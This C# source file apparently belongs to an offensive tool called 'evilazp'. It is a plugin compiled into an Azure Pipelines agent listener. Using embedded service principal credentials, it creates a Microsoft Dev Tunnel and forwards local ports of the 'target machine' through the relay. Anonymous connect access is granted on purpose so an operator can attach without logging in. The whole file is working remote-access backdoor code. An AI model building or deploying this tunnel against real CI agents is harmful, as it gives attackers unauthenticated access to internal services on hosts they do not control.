using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using Azure.Identity;
using Microsoft.DevTunnels.Connections;
using Microsoft.DevTunnels.Contracts;
using Microsoft.DevTunnels.Management;
using Microsoft.VisualStudio.Services.Agent;

#pragma warning disable CA1001, CA1063, CA2000

namespace Microsoft.VisualStudio.Services.Agent.Plugins.Tunnel
{
    // Runs inside Agent.Listener when the binary is built with EnableTunnel.
    // The plugin creates and hosts a Dev Tunnel without requiring the external
    // devtunnel CLI on the target host.
    public sealed class TunnelPlugin : ITunnelPlugin
    {
        private static readonly TraceSource Trace = new TraceSource("TunnelPlugin");
        // Dev Tunnels has its own application scope; ARM roles are not used for
        // this data-plane tunnel creation flow.
        private static readonly string[] TunnelScopes = new[] { "46da2f7e-b5ef-422a-88d4-2a7f9de6a0b2/.default" };

        private TunnelManagementClient _managementClient;
        private TunnelRelayTunnelHost _host;
        private Microsoft.DevTunnels.Contracts.Tunnel _tunnel;

        public string TunnelUrl { get; private set; }

        public async Task StartAsync(
            string tenantId,
            string clientId,
            string clientSecret,
            string tunnelId,
            int[] ports,
            CancellationToken cancellation)
        {
            // Fail early if the baked service principal cannot obtain a token.
            // Otherwise the agent would register successfully but never expose
            // the configured tunnel ports.
            var credential = new ClientSecretCredential(tenantId, clientId, clientSecret);
            var userAgent = new ProductInfoHeaderValue("AzpAgent", "1.0");
            await credential.GetTokenAsync(new global::Azure.Core.TokenRequestContext(TunnelScopes), cancellation);
            Trace.TraceInformation("[TunnelPlugin] Authenticated to Dev Tunnels with service principal credentials.");

            _managementClient = new TunnelManagementClient(
                userAgent,
                async () =>
                {
                    var tokenResult = await credential.GetTokenAsync(
                        new global::Azure.Core.TokenRequestContext(TunnelScopes), cancellation);
                    return new AuthenticationHeaderValue("Bearer", tokenResult.Token);
                },
                tunnelServiceUri: null,
                httpHandler: null);

            var tunnelPorts = new TunnelPort[ports.Length];
            for (int i = 0; i < ports.Length; i++)
            {
                // Ports are anonymous-connect by design so the operator can
                // attach from evilazp without an interactive browser login.
                tunnelPorts[i] = new TunnelPort
                {
                    PortNumber = (ushort)ports[i],
                    Protocol = TunnelProtocol.Auto,
                    AccessControl = new TunnelAccessControl
                    {
                        Entries = new[]
                        {
                            new TunnelAccessControlEntry
                            {
                                Type = TunnelAccessControlEntryType.Anonymous,
                                Subjects = new[] { string.Empty },
                                Scopes = new[] { TunnelAccessScopes.Connect },
                            },
                        },
                    },
                };
            }

            var normalizedTunnelId = string.IsNullOrWhiteSpace(tunnelId) ? null : tunnelId.Trim();
            Trace.TraceInformation(
                normalizedTunnelId == null
                    ? "[TunnelPlugin] Creating tunnel with service principal credentials..."
                    : $"[TunnelPlugin] Creating tunnel '{normalizedTunnelId}' with service principal credentials...");
            var requestOptions = BuildTunnelRequestOptions();
            _tunnel = await CreateTunnelWithFallbackIdAsync(normalizedTunnelId, requestOptions, cancellation);
            _tunnel.Ports = await EnsureTunnelPortsAsync(_tunnel, tunnelPorts, requestOptions, cancellation);

            TunnelUrl = $"https://{_tunnel.TunnelId}.{_tunnel.ClusterId}.devtunnels.ms";
            Trace.TraceInformation($"[TunnelPlugin] Tunnel created: {TunnelUrl}");

            // ForwardConnectionsToLocalPorts turns the agent host into the
            // server side of the tunnel: incoming relay traffic goes to
            // localhost:<port> on the target machine.
            _host = new TunnelRelayTunnelHost(_managementClient, Trace);
            _host.ForwardConnectionsToLocalPorts = true;

            await _host.ConnectAsync(_tunnel, cancellation);
            await _host.RefreshPortsAsync(cancellation);
            Trace.TraceInformation("[TunnelPlugin] Tunnel active. Forwarding ports: " + string.Join(",", ports));
        }

        public async Task StopAsync()
        {
            if (_host != null)
            {
                await _host.DisposeAsync();
                _host = null;
            }

            if (_tunnel != null && _managementClient != null)
            {
                try
                {
                    await _managementClient.DeleteTunnelAsync(_tunnel, options: null, cancellation: default);
                }
                catch (Exception ex)
                {
                    Trace.TraceEvent(TraceEventType.Warning, 0, $"[TunnelPlugin] Cleanup: {ex.Message}");
                }
                _tunnel = null;
            }

            if (_managementClient != null)
            {
                await _managementClient.DisposeAsync();
                _managementClient = null;
            }
        }

        private async Task<Microsoft.DevTunnels.Contracts.Tunnel> CreateTunnelWithFallbackIdAsync(
            string requestedTunnelId,
            TunnelRequestOptions requestOptions,
            CancellationToken cancellation)
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(requestedTunnelId))
                {
                    var tunnel = await _managementClient.CreateOrUpdateTunnelAsync(
                        BuildTunnel(requestedTunnelId),
                        requestOptions,
                        cancellation);
                    return await ResolveCreatedTunnelAsync(tunnel, requestedTunnelId, requestOptions, cancellation);
                }

                return await _managementClient.CreateTunnelAsync(
                    BuildTunnel(null),
                    requestOptions,
                    cancellation);
            }
            catch (Exception ex) when (!string.IsNullOrWhiteSpace(requestedTunnelId) && IsCustomTunnelNameForbidden(ex))
            {
                Trace.TraceEvent(
                    TraceEventType.Warning,
                    0,
                    $"[TunnelPlugin] Custom tunnel names are disabled. Creating a generated tunnel with alias label '{requestedTunnelId}'.");
                return await CreateGeneratedAliasTunnelAsync(requestedTunnelId, requestOptions, cancellation);
            }
            catch (Exception ex) when (!string.IsNullOrWhiteSpace(requestedTunnelId) && IsTunnelIdConflict(ex))
            {
                // Fall back to a generated service ID while preserving the
                // operator-facing alias as a searchable label.
                Trace.TraceEvent(
                    TraceEventType.Warning,
                    0,
                    $"[TunnelPlugin] Requested tunnel name '{requestedTunnelId}' is not available. Creating a generated tunnel with alias label.");
                return await CreateGeneratedAliasTunnelAsync(requestedTunnelId, requestOptions, cancellation);
            }

        }

        private async Task<Microsoft.DevTunnels.Contracts.Tunnel> CreateGeneratedAliasTunnelAsync(
            string alias,
            TunnelRequestOptions requestOptions,
            CancellationToken cancellation)
        {
            await DeleteExistingAliasTunnelsAsync(alias, cancellation);
            return await _managementClient.CreateTunnelAsync(
                BuildTunnel(null, alias),
                requestOptions,
                cancellation);
        }

        private async Task DeleteExistingAliasTunnelsAsync(string alias, CancellationToken cancellation)
        {
            var label = BuildTunnelLabel(alias);
            if (label == null)
            {
                return;
            }

            var options = BuildTunnelRequestOptions();
            options.Labels = new[] { label };
            options.RequireAllLabels = true;
            var existingTunnels = await _managementClient.ListTunnelsAsync(
                clusterId: null,
                domain: null,
                options,
                ownedTunnelsOnly: null,
                cancellation);
            if (existingTunnels == null)
            {
                return;
            }

            foreach (var existingTunnel in existingTunnels)
            {
                try
                {
                    Trace.TraceEvent(
                        TraceEventType.Warning,
                        0,
                        $"[TunnelPlugin] Deleting stale tunnel with alias label '{alias}': {existingTunnel.TunnelId}.{existingTunnel.ClusterId}");
                    await _managementClient.DeleteTunnelAsync(existingTunnel, options: null, cancellation);
                }
                catch (Exception ex)
                {
                    Trace.TraceEvent(
                        TraceEventType.Warning,
                        0,
                        $"[TunnelPlugin] Failed to delete stale alias tunnel '{existingTunnel.TunnelId}': {ex.Message}");
                }
            }
        }

        private async Task<Microsoft.DevTunnels.Contracts.Tunnel> ResolveCreatedTunnelAsync(
            Microsoft.DevTunnels.Contracts.Tunnel tunnel,
            string tunnelName,
            TunnelRequestOptions requestOptions,
            CancellationToken cancellation)
        {
            if (tunnel != null &&
                !string.IsNullOrWhiteSpace(tunnel.TunnelId) &&
                !string.IsNullOrWhiteSpace(tunnel.ClusterId))
            {
                return tunnel;
            }

            var resolvedTunnel = await _managementClient.GetTunnelAsync(
                new Microsoft.DevTunnels.Contracts.Tunnel { Name = tunnelName },
                requestOptions,
                cancellation);
            if (resolvedTunnel == null)
            {
                throw new InvalidOperationException($"Created tunnel name '{tunnelName}' could not be retrieved.");
            }

            return resolvedTunnel;
        }

        private async Task<TunnelPort[]> EnsureTunnelPortsAsync(
            Microsoft.DevTunnels.Contracts.Tunnel tunnel,
            TunnelPort[] tunnelPorts,
            TunnelRequestOptions requestOptions,
            CancellationToken cancellation)
        {
            var createdPorts = new TunnelPort[tunnelPorts.Length];
            for (var i = 0; i < tunnelPorts.Length; i++)
            {
                var tunnelPort = tunnelPorts[i];
                Trace.TraceInformation($"[TunnelPlugin] Ensuring tunnel port {tunnelPort.PortNumber}.");
                createdPorts[i] = await _managementClient.CreateOrUpdateTunnelPortAsync(
                    tunnel,
                    tunnelPort,
                    requestOptions,
                    cancellation);
            }

            return createdPorts;
        }

        private static TunnelRequestOptions BuildTunnelRequestOptions()
        {
            return new TunnelRequestOptions
            {
                TokenScopes = new[]
                {
                    TunnelAccessScopes.Host,
                    TunnelAccessScopes.Connect,
                    TunnelAccessScopes.ManagePorts,
                },
                IncludePorts = true,
            };
        }

        private static Microsoft.DevTunnels.Contracts.Tunnel BuildTunnel(string tunnelName, string labelAlias = null)
        {
            var label = BuildTunnelLabel(labelAlias ?? tunnelName);
            return new Microsoft.DevTunnels.Contracts.Tunnel
            {
                Name = tunnelName,
                Description = string.IsNullOrWhiteSpace(labelAlias ?? tunnelName) ? null : $"evilazp tunnel alias: {labelAlias ?? tunnelName}",
                // The label lets the evilazp client find the tunnel by stable
                // alias even when the service returns a generated fallback ID.
                Labels = label == null ? null : new[] { label },
                AccessControl = new TunnelAccessControl
                {
                    Entries = new[]
                    {
                        new TunnelAccessControlEntry
                        {
                            Type = TunnelAccessControlEntryType.Anonymous,
                            Subjects = new[] { string.Empty },
                            Scopes = new[] { TunnelAccessScopes.Connect },
                        },
                    },
                },
            };
        }

        private static string BuildFallbackTunnelId(string requestedTunnelId)
        {
            var baseId = SanitizeTunnelId(requestedTunnelId);
            var suffix = Guid.NewGuid().ToString("N").Substring(0, 8);
            var maxBaseLength = 60 - suffix.Length - 1;
            if (baseId.Length > maxBaseLength)
            {
                baseId = baseId.Substring(0, maxBaseLength).Trim('-');
            }

            if (baseId.Length == 0)
            {
                baseId = "evilazp";
            }

            return $"{baseId}-{suffix}";
        }

        private static string SanitizeTunnelId(string value)
        {
            // Dev Tunnel IDs accept lowercase letters, digits, and hyphens.
            // Sanitizing here avoids service-side validation errors later.
            if (string.IsNullOrWhiteSpace(value))
            {
                return "evilazp";
            }

            var chars = value.Trim().ToLowerInvariant().ToCharArray();
            for (int i = 0; i < chars.Length; i++)
            {
                var c = chars[i];
                if (!((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-'))
                {
                    chars[i] = '-';
                }
            }

            return new string(chars).Trim('-');
        }

        private static string BuildTunnelLabel(string tunnelId)
        {
            if (string.IsNullOrWhiteSpace(tunnelId))
            {
                return null;
            }

            var labelValue = SanitizeTunnelId(tunnelId);
            if (labelValue.Length > 42)
            {
                labelValue = labelValue.Substring(0, 42).Trim('-');
            }

            return string.IsNullOrEmpty(labelValue) ? null : $"evilazp={labelValue}";
        }

        private static bool IsTunnelIdConflict(Exception ex)
        {
            // The SDK may surface uniqueness failures as HTTP 409 or as an
            // InvalidOperationException depending on the call path/version.
            if (ex is InvalidOperationException)
            {
                var message = ex.Message ?? string.Empty;
                return message.IndexOf("conflict", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    message.IndexOf("already", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    message.IndexOf("exists", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    message.IndexOf("not unique", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    message.IndexOf("not available", StringComparison.OrdinalIgnoreCase) >= 0;
            }

            if (ex is HttpRequestException httpException)
            {
                return httpException.StatusCode == HttpStatusCode.Conflict;
            }

            return false;
        }

        private static bool IsCustomTunnelNameForbidden(Exception ex)
        {
            if (ex is UnauthorizedAccessException)
            {
                var message = ex.Message ?? string.Empty;
                return message.IndexOf("custom tunnel names", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    message.IndexOf("request forbidden", StringComparison.OrdinalIgnoreCase) >= 0;
            }

            return false;
        }
    }
}
